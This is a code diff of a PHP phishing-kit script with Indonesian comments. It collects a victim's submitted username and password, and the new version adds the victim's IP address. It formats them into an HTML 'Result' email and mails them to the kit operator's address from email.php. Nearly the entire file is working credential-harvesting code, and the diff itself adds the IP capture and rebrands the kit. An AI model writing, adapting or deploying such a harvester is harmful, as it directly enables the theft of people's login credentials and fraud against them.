@@ -1,11 +1,10 @@
-<?php 
+<?php
 
-// MENANGKAP DATA YANG DI-INPUT
-$email = $_POST['email'];
-$password = $_POST['password'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
 
-// KONTEN RESULT AKUN
-$subjek = "Result | Punya si $email";
+$subjek = "Result | Punya si $user";
 $pesan = <<<EOD
 <!DOCTYPE html>
 	<html>
@@ -84,26 +83,29 @@ $pesan = <<<EOD
 				</tr>
 				<tr>
 					<td style="border-right: none;">Email</td>
-					<td style="text-align: center;">$email</td>
+					<td style="text-align: center;">$user</td>
 				</tr>
                 <tr>
 					<td style="border-right: none;">Password</td>
-					<td style="text-align: center;">$password</td>
+					<td style="text-align: center;">$pass</td>
 				</tr>
-				
+               <tr>
+					<td style="border-right: none;">IP Address</td>
+					<td style="text-align: center;">$ip</td>
+				</tr>			
 				<tr>
-					<th style="text-align: center;" colspan="3">&copy; AlexHosting</th>
+					<th style="text-align: center;" colspan="3">&copy; Arya ThiQo</th>
 				</tr>
 			</table>
 		</div>
 	</body>
 	</html>
 EOD;
+
 include 'email.php';
-$sender ='From: Web AryaThiQo <alexhostx@anjirrrr.com>';
 $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 $headers .= ''.$sender.'' . "\r\n";
-mail($alexhost, $subjek, $pesan, $headers);
+mail($email, $subjek, $pesan, $headers);
 
 ?>
